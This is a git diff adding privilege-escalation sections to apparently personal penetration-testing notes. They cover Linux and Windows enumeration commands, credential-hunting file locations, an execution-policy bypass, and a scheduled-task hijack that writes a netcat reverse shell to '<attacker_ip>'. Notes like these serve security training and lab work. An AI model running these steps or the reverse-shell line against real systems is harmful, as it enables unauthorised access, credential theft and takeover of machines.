@@ -173,7 +173,7 @@ nmap <scan_type> <options> <machine_ip/network>
             -vv                     very verbose
             -d                      debugging
             -dd                     more details for debugging
-            -sV                     service detection
+            -sV                     service detection (doesn't work with scan type -sS)
             -sV --version-light     intensity level 2
             -sV --version-all       intensity level 9
             -O                      detect OS
@@ -214,7 +214,7 @@ https://www.revshells.com/
 
 https://github.com/samratashok/nishang/tree/master
 
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+[PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 ### Netcat:
 Reverse Shell:
@@ -369,7 +369,182 @@ need to trigger rev-shell -> find upload folder -> add to url-path `http://<ip>/
 
 ## 6. Linux Privilege Escalation:
 
+### Tools:
+
+[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+
+[LinEnum](https://github.com/rebootuser/LinEnum)
+
+[LES (Linux Exploti Suggester)](https://github.com/mzet-/linux-exploit-suggester)
+
+[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+
+[Linux Priv Checker](https://github.com/linted/linuxprivchecker)
+
+### manual Enumeration:
+
+`hostname`
+
+`uname -a`
+
+`cat /etc/os-release`
+
+`cat /etc/issue`
+
+`id`
+
+`whoami`
+```
+    ps          
+        -A      view all running processes
+        aux     a = show processes for all users
+                u = show who launched process
+                x = show processes not attached to terminal
+        axjf    view process tree
+```
+`env`
+
+`sudo -l`
+
+`cat /etc/passwd`
+
+`cat /etc/passwd | cut -d ":" -f 1`
+
+`cat history`
+
+```
+    netstat
+        -a      show all listening ports
+        -at     show tcp ports
+        -au     show udp ports
+        -l      list ports in listening mode (can be used with -t option)
+        -s      show network usage statisticsby protocol (can be used with -t/-u option)
+        -tp     show conncetions with service name and PID (can be used with -l option)
+        -i      show interfaces
+        -ano
+            -a  display all sockets
+            -n  do not resolve names
+            -o  display timers
+```
+`unshadow passwd.txt shadow.txt > passwords.txt`
+
+#### Suid:
+
+`find / -type f -perm -04000 -ls 2>/dev/null`
+
+#### Capabilities:
+`getcap -r / 2>/dev/null`
+
+#### Cron Jobs:
+`cat /etc/crontab`
+
+#### PATH:
+`echo $PATH`
+
+`find / -writable 2>/dev/null`
+
+`find / -writable 2>/dev/null | cut -de "/" -f 2 | sort -u`
+
+`find / -writable 2>/dev/null | cut -de "/" -f 2,3 | grep -v proc | sort -u`
+
+add /tmp folder to path: `export PATH=/tmp:$PATH`
+
+run path: `./path`
+
+#### NFS:
+
+`showmount -e <ip>`
+
+
+
 ## 7. Windows Privilege Escalation:
+
+### useful Links:
+
+[PayloadAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+
+### Tools:
+
+1. [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+
+2. [PrivescCheck](https://github.com/itm4n/PrivescCheck)
+
+    We need to bypass Execution Policy in order to run this tool.
+
+    ```
+    Powershell:
+        Set-ExecutionPolicy Bypass -Scope process -Force
+        . .\PrivescCheck.ps1
+        Invoke-PrivescCheck
+    ```
+3. [WES-NG (Windows Exploit Suggester - Next Generation)](https://github.com/bitsadmin/wesng)
+
+    Before use run `wes.py --update` to update database and run `systeminfo > systeminfo.txt` on target system.
+    Then WES-NG can be used with `wes.py systeminfo.txt`.
+
+4. Metasploit
+    
+    Use the `multi/recon/local_exploit_suggester` module.
+
+### manual Enumeration:
+
+#### Usual Spots:
+
+1. Unattended Windows Installations
+    - C:\Unattend.xml
+    - C:\Windows\Panther\Unattend.xml
+    - C:\Windows\Panther\Unattend\Unattend.xml
+    - C:\Windows\system32\sysprep.inf
+    - C:\Windows\system32\sysprep\sysprep.xml
+
+2. Powershell history
+    
+    cmd.exe: `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
+    
+    Powershell: `type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
+
+3. Saved Windows Credentials:
+
+    `cmdkey /list` -> `runas /savecred /user:<username> cmd.exe`
+
+4. IIS:
+    - C:\inetpub\wwwroot\web.config
+    - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+    `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
+
+5. Retrieve Credentials over PuTTY: 
+
+    `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
+
+#### Scheduled Tasks:
+    Overview: schtasks
+    Detailed view: schtasks /query /tn <task_name> /fo list /v
+    Check if executable can be modifyed by us: icasl <executable-path>
+    Modify Task: echo c:\tools\nc64.exe -e cmd.exe <attacker_ip> <port> > <old_executable_path>
+    Run task immediately: schtasks /run /tn <task_name>
+
+#### Windows Services:
+    List Services:
+        services.msc
+        cmd.exe:    sc queryex type= service state= all
+        Powershell: Get-Service
+    View details:   sc qc <service_name>
+    Check permissions: icals <executable_path>
+    Start/Stop Service: sc start/stop <service>
+
+    in Powershell replace sc with sc.exe
+
+
+#### Windows Privileges:
+
+`whoami /priv`
+
+TO-DO
+
+#### unpatched Software:
+
+`wmic product get name,version,vendor`
 
 ## 8. Password/Hash Cracking:
 
